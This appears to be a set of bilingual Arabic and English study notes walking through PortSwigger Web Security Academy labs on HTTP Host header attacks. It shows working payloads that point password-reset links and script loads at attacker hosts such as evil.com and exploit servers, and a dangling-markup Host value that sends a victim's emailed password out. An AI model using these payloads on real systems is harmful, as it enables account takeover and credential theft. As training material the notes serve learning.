# HTTP Host header vulnerabilities

---

<details>
  <summary>HTTP Host header vulnerabilities</summary>


🧠 الأول: يعني إيه Host Header؟
===============================

لما تبعت request:

```
GET / HTTP/1.1Host: example.com
```

الـ **Host** بيقول للسيرفر:

> أنا عايز أكلم أي domain؟

* * * * *

💥 المشكلة بتيجي إمتى؟
======================

لما السيرفر:

> **يثق في Host header من غير validation**

* * * * *

😈 أشهر سيناريو خطير (لازم تحفظه)
=================================

🔥 Password Reset Poisoning
---------------------------

السيرفر بيعمل reset link كده:

```
https://example.com/reset?token=XYZ
```

بس بيستخدم الـ Host من request:

```
https://<Host>/reset?token=XYZ
```

* * * * *

⚔️ الهجوم:
----------

إنت تبعت:

```
POST /reset-password HTTP/1.1Host: evil.com
```

* * * * *

💥 النتيجة:
-----------

السيرفر يبعت للضحية:

```
https://evil.com/reset?token=XYZ
```

🎉 الضحية يضغط اللينك → يروح عندك\
→ تسرق التوكن\
→ تاخد الأكونت

* * * * *

🔍 أنواع vulnerabilities مهمة
=============================

1️⃣ Host header injection
-------------------------

-   تغيير Host مباشرة

* * * * *

2️⃣ X-Forwarded-Host bypass
---------------------------

لو فيه proxy:

```
X-Forwarded-Host: evil.com
```

* * * * *

3️⃣ Absolute URL generation
---------------------------

-   السيرفر يستخدم Host يعمل URLs

* * * * *

4️⃣ Cache poisoning
-------------------

-   تخلي الكاش يخزن response غلط

* * * * *

5️⃣ SSRF bypass
---------------

-   بعض السيستم بيستخدم Host internally

* * * * *

🧪 تبدأ إزاي عملي؟
==================

في Burp:
--------

جرّب تعدّل:

```
Host: attacker.com
```

أو:

```
Host: 127.0.0.1
```

أو:

```
Host: evil.comX-Forwarded-Host: evil.com
```







  
</details>









-------------


# **`Labs`**


<details>
  <summary>Lab: Basic password reset poisoning</summary>


1. instead of login click **`forget-passowrd`**
2. intercept the request and edit **`host`** header

```
exploit-0a5f00600469f3d78021026b01c10016.exploit-server.net
```

<img width="1514" height="294" alt="image" src="https://github.com/user-attachments/assets/fd61890e-c523-4a6d-8ae0-8c68a1f358b6" />

## check the exploit server 

<img width="1916" height="211" alt="image" src="https://github.com/user-attachments/assets/6e27dc65-d648-4092-b823-d059c0126263" />

<img width="1461" height="449" alt="image" src="https://github.com/user-attachments/assets/05f6dd85-1d24-4f79-afe4-02c7c5eb5f4c" />


  
</details>




<details>
  <summary>Lab: Host header authentication bypass</summary>


> ## to solve the lab we need to delete user **`carlos`**

---

1. by looking in **`robots.txt`** found

```
/admin
```

<img width="753" height="86" alt="image" src="https://github.com/user-attachments/assets/fb4c427e-2dbb-4566-9601-2e2ea8760077" />



## if try to visit this endpoint i found 

```
https://0aad00a80370d42e82cab5b600ec0048.web-security-academy.net/admin
```

<img width="1475" height="354" alt="image" src="https://github.com/user-attachments/assets/735b23fb-4906-47f4-a729-0b0cb0847916" />


## so let's try to change **`Host`** header with **`localhost`**

<img width="1640" height="450" alt="image" src="https://github.com/user-attachments/assets/0666f133-9000-474c-8c94-1cdc3a768901" />


## now delete carlos 

```HTTP
GET /admin/delete?username=carlos
```

<img width="1356" height="214" alt="image" src="https://github.com/user-attachments/assets/5d32a125-bac9-434f-8f48-e1d9f73be393" />



  
</details>




<details>
  <summary>Lab: Web cache poisoning via ambiguous requests</summary>




<details>
  <summary>explain</summary>


🧠 الأول: يعني إيه Web Cache Poisoning؟
=======================================

السيرفر بيبقى عنده **cache**:

👉 بدل ما يرد كل مرة، يخزن response ويرجّعه بسرعة

* * * * *

💥 المشكلة:
-----------

> لو قدرت تخلي السيرفر يخزن **response متلعب فيه**\
> أي user بعدك هياخده زي ما هو 😈

* * * * *

🎯 هدف اللاب
============

تخلي الصفحة الرئيسية:

```
alert(document.cookie)
```

تشتغل عند الضحية

* * * * *

🔍 الفكرة الأساسية في اللاب
===========================

فيه **اختلاف (discrepancy)** بين:

-   الكاش
-   الباك إند

* * * * *

😈 الخدعة هنا
=============

السيرفر:
--------

✔️ بيشيّك على أول `Host` بس\
❌ لكن بيستخدم **التاني في الـ response**

* * * * *

🧪 نمشي خطوة خطوة
=================

* * * * *

1️⃣ اختبار عادي
---------------

بعت:

```
GET /Host: lab.com
```

✔️ شغال

* * * * *

❌ لما تغيّر Host:
-----------------

```
Host: evil.com
```

👉 السيرفر يرفض

✔️ يبقى فيه validation

* * * * *

🔥 2️⃣ Cache Buster
===================

بتضيف:

```
GET /?cb=123
```

💡 ليه؟

علشان:

> تجيب response جديد من السيرفر مش من الكاش

* * * * *

😈 3️⃣ الهجوم الحقيقي (2 Host headers)
======================================

تبعت:

```
Host: lab.comHost: evil.com
```

* * * * *

💥 اللي بيحصل:
--------------

### السيرفر:

-   يستخدم أول Host → validation ✔️
-   لكن يستخدم التاني → في response 😈

* * * * *

👀 تلاحظ:
---------

في response:

```
<script src="https://evil.com/resources/js/tracking.js"></script>
```

🔥🔥🔥

* * * * *

🧠 النقطة المهمة
================

> إنت مش بتغيّر الصفحة\
> إنت بتغيّر **مكان تحميل script**

* * * * *

😈 4️⃣ استغلال ده
=================

تروح على exploit server\
وتحط:

```
alert(document.cookie)
```

في:

```
/resources/js/tracking.js
```

* * * * *

💥 5️⃣ ترجع Burp
================

تبعت:

```
GET /?cb=123Host: lab.comHost: exploit-server.net
```

* * * * *

🎯 الهدف:
---------

تخلي الكاش يخزن:

```
<script src="https://exploit-server.net/resources/js/tracking.js">
```

* * * * *

🔥 6️⃣ Cache Poisoning
======================

كرر request لحد ما تشوف:

> cache hit

👉 كده الصفحة poisoned

* * * * *

😈 7️⃣ الضحية يدخل
==================

لما يفتح:

```
GET /
```

💥 الكاش يرد عليه بالنسخة poisoned

* * * * *

🎉 النتيجة:
-----------

```
alert(document.cookie)
```

يتنفذ


  
</details>






1. open website and intercpt the request in brup
2. try to change host header find that there is validation on it
3. but when put another host header it's sended and to save it in cash send request twice 


<img width="1546" height="537" alt="image" src="https://github.com/user-attachments/assets/fa202666-2c6a-4098-9e16-e950b880c0ef" />

## look at the response it came form cashe and it's save the second host header in script tag 

4. go to exploit server create file **`/resources/js/tracking.js`** with payload


```
alert(document.cookie)
```

## put it in second host header and send it 

```
Host: exploit-0a99003b04f1b81783da14cf013500ae.exploit-server.net
```

<img width="1558" height="465" alt="image" src="https://github.com/user-attachments/assets/aa5a84e7-2566-4240-9ed7-bb9f8793278e" />


<img width="1680" height="296" alt="image" src="https://github.com/user-attachments/assets/edbc9544-c451-454f-83f4-1597e2e13c1b" />


  
</details>






<details>
  <summary>Lab: Routing-based SSRF</summary>


1. first to idnetfy the ssrf vuln put link of colab or any other server in **`host`** header to see if it will send request
2. fuzz on ip to find internal ip 

<img width="1795" height="412" alt="image" src="https://github.com/user-attachments/assets/2fbc52aa-c698-49a9-bc4b-cdccdcebe215" />

## **`133`**

<img width="1551" height="176" alt="image" src="https://github.com/user-attachments/assets/10245594-deb9-49b4-9d91-34915ef6f494" />

## now send request to remove carlos

```
GET /admin/delete?csrf=edr1QLyhWmO3PonUStOtWtIXQvjDJqy1&username=carlos
```

<img width="1469" height="244" alt="image" src="https://github.com/user-attachments/assets/a821201f-4fae-4cd7-965a-6060faf5fb2e" />




  
</details>




<details>
  <summary>Lab: SSRF via flawed request parsing</summary>

## first prove the vuln

```
GET https://lab-id.web-security-academy.net/
Host: collaborator
```


## after that do same as the last lab


<img width="1548" height="134" alt="image" src="https://github.com/user-attachments/assets/9583d0f9-7eac-4d1d-87fc-dee4e86d94e1" />

<img width="1344" height="245" alt="image" src="https://github.com/user-attachments/assets/2a1025c8-37c4-472c-9839-6fabde513203" />

<img width="1490" height="179" alt="image" src="https://github.com/user-attachments/assets/d1056259-39e2-40c4-92c6-a4fb41d11a8a" />













🧠 The profound difference remains
===================

🟢 First lap:
---------------

- bug = trust in Host header

* * * * *

🔴 This laptop:
------------

- bug = **inconsistent parsing**
- validation ≠ usage


  
</details>





<details>
  <summary>Lab: Host validation bypass via connection state attack</summary>



<details>
  <summary>explain</summary>


🧠 الفكرة العامة (Connection State Attack)
==========================================

السيرفر الأمامي (Front-end) بيعمل validation للـ Host...\
بس فيه غلطة قاتلة:

> بيحدد "الثقة" في الـ connection كله بناءً على **أول request بس**

* * * * *

😈 يعني إيه الكلام ده؟
======================

لو عندك connection (TCP):

```
Request 1 → validatedRequest 2 → trusted automatically 😱
```

👉 حتى لو request 2 فيه Host malicious

* * * * *

🔥 ده اسمه:
===========

> **Connection state confusion**

* * * * *

🧪 نمشي في اللاب
================

* * * * *

❌ تجربة عادية (فشل)
-------------------

تبعت:

```
GET /adminHost: 192.168.0.1
```

👉 السيرفر يقولك:

> لا... ويرجعك homepage

✔️ validation شغال

* * * * *

😈 الحل بقى
===========

⚔️ هتستخدم requestين في نفس connection
--------------------------------------

* * * * *

🟢 Request 1 (clean)
--------------------

```
GET /Host: lab-id.web-security-academy.netConnection: keep-alive
```

✔️ request سليم\
✔️ السيرفر يقول: connection trusted

* * * * *

🔴 Request 2 (evil)
-------------------

```
GET /adminHost: 192.168.0.1
```

* * * * *

💥 اللي بيحصل:
==============

1.  السيرفر يشوف أول request → تمام ✅
2.  يقول: "connection دي trusted"
3.  request التاني → **مش بيعمله validation** 😈

🎉 تدخل admin

* * * * *

🧠 ليه ده بيحصل؟
================

السيرفر بيعمل optimization:

> بدل ما يشيك كل request... يشيك أول واحدة بس

💥 وده bug

* * * * *

⚠️ النقطة المهمة
================

لازم:

```
Connection: keep-alive
```

👉 علشان الاتنين يبقوا على نفس connection

* * * * *

😈 المرحلة التانية (Delete carlos)
==================================

بعد ما دخلت:

```
/admin
```

لقيت form:

```
/admin/delete
```


  
</details>



1. send two reqests to repeater first one must be legit or correct one and use same connection

```http
GET / HTTP/1.1
Host: 0ad600a504f4a5f78100393f00a20095.h1-web-security-academy.net
Cookie: session=JVSDpuztnWD1valTniB2ggQQJOhiMPIP; _lab=46%7cMCwCFCDNHEhanOsZrJwpBkv2E0fMdaxZAhQaakLv2%2fAvegffRXNScYgmsKqoo8Fd%2f5tcyj8g1%2fXbuiow2EcW892o1t2iVIj4QQCjsibsF3RpB6J%2bALuekcD3dMTdWiSWb%2f3NgBf7iJpYM6g4%2f5hgxUecdLBG3w%2fFw5EjuEtpedRoOwiWkfo%3d
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: keep-alive    < ---------
```


## **`second request`**

```http
GET /admin HTTP/1.1
Host: 192.168.0.1
Cookie: session=JVSDpuztnWD1valTniB2ggQQJOhiMPIP; _lab=46%7cMCwCFCDNHEhanOsZrJwpBkv2E0fMdaxZAhQaakLv2%2fAvegffRXNScYgmsKqoo8Fd%2f5tcyj8g1%2fXbuiow2EcW892o1t2iVIj4QQCjsibsF3RpB6J%2bALuekcD3dMTdWiSWb%2f3NgBf7iJpYM6g4%2f5hgxUecdLBG3w%2fFw5EjuEtpedRoOwiWkfo%3d
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: keep-alive
```

## add them to group and select 

```
Send group in sequence (single connection)
```

<img width="1576" height="563" alt="image" src="https://github.com/user-attachments/assets/286ed1c0-d1f2-4a5c-a683-67481f50464d" />

## now delete carlos

```
csrf=Ew2kRBMwhYI8QDQnuykBUwHR0RPjevch&username=carlos
```

<img width="1283" height="475" alt="image" src="https://github.com/user-attachments/assets/7e55883a-cabf-4c50-951a-a6bfc6b1b0f4" />

<img width="1624" height="307" alt="image" src="https://github.com/user-attachments/assets/02a10df3-f0e4-400a-b3c5-0601e8e6414e" />






  
</details>







<details>
  <summary>Lab: Password reset poisoning via dangling markup</summary>


<details>
  <summary>explain</summary>


🧠 الفكرة العامة
================

الموقع لما تعمل password reset:

❌ مش بيبعت لينك فيه token\
✔️ بيبعت **الباسورد الجديد مباشرة في الإيميل**

* * * * *

💥 المشكلة
----------

الإيميل بيتكوّن HTML\
وبيستخدم بيانات من الـ request (زي Host)

👉 من غير escaping كويس

* * * * *

😈 إنت عايز تعمل إيه؟
=====================

> تسرّب (exfiltrate) الباسورد اللي في الإيميل\
> من غير ما تشوف الإيميل بتاع الضحية

* * * * *

🔍 أول ملاحظة مهمة
==================

في الإيميل:

-   فيه **link**
-   وHost بيتحط جواه

* * * * *

🧪 لما لعبت في Host:
--------------------

```
Host: lab.net:1234
```

👀 لقيت:

> الـ port بيظهر جوه HTML

* * * * *

🧠 ده معناه:
============

> input بتاعك بيتحط جوه HTML attribute

زي:

```
<a href='https://lab.net:1234/...'>
```

* * * * *

🔥 هنا بقى الهجوم
=================

😈 تكسر الـ HTML
----------------

بدل ما تحط port عادي\
تحط payload:

```
Host: lab.net:'<a href="//exploit-server.net/?
```

* * * * *

💥 اللي حصل:
============

إنت عملت:

1.  قفلت الـ attribute `'`
2.  فتحت `<a>` جديدة
3.  خليتها تشير للـ exploit server

* * * * *

🧠 اسم ده:
==========

> **Dangling markup injection**

* * * * *

😈 طيب فين السرقة؟
==================

الإيميل بيبقى:

```
<a href="//exploit-server.net/? ... باقي الإيميل ... password=XYZ">
```

* * * * *

💥 المتصفح يعمل إيه؟
--------------------

يحاول يكمّل اللينك:

👉 ياخد كل اللي بعد `?`\
👉 ويبعت request للـ exploit server

* * * * *

🎉 النتيجة
==========

الـ exploit server يستقبل:

```
GET /?....password=XYZ
```

🔥🔥🔥


  
</details>


----


1. instead login as **`wiener`** click forget password 
2. send request to repeater 
3. first try to add **`port`** number and see if it will appear in email

```
https://0a15008e035dc4d180120dba00f5002f.web-security-academy.net:4444/login
```

<img width="1545" height="452" alt="image" src="https://github.com/user-attachments/assets/cf927aba-33cf-42f3-b7ae-8421fcbbd3aa" />

## good now inject our payload in **`host`** header

```
Host: 0a15008e035dc4d180120dba00f5002f.web-security-academy.net:'<a href="//exploit-0a8e009c037fc4f680c80c61018f00ca.exploit-server.net/?
```

<img width="1628" height="471" alt="image" src="https://github.com/user-attachments/assets/79580466-31b3-4755-bc01-edf47c967702" />

## look at logs of server

<img width="1913" height="403" alt="image" src="https://github.com/user-attachments/assets/56b96150-719f-47e0-915c-8b0ed7d9ad7c" />

```
carlos : oSD96Zf4ZX
```

<img width="1372" height="403" alt="image" src="https://github.com/user-attachments/assets/616a6987-e25d-4fb4-9fb0-db2adbd3b526" />







  
</details>


































































